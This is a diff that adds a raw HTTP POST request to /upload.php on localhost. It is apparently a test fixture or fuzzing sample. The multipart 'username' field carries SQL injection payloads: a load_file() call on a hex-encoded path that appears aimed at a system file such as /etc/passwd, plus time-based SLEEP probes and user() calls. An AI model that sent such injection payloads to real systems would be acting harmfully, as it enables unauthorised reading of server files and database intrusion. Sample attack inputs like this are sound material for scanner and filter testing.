@@ -1,0 +1,15 @@
+POST /upload.php HTTP/1.1
+Host: 127.0.0.1
+Accept: */*
+Accept-Language: en
+User-Agent: Openwave/3.3 (iPod 8.1; Windows 2.1; Avant Browser 5.2)  Presto/6.4.3 Version/7 1.4
+Connection: close
+Content-Type: multipart/form-data; boundary=----yFLbNbPRGpwYSQvqhKHMTsHJsO
+Content-Length: 243
+
+------yFLbNbPRGpwYSQvqhKHMTsHJsO
+Content-Disposition: form-data; name=\"username\";
+
+replace(load_file(0x2F374632F70617373779),0x9,0x1) + user()-SlEEp(2);
+user()--1e3 and 3+SlEEp(2)
+------yFLbNbPRGpwYSQvqhKHMTsHJsO--
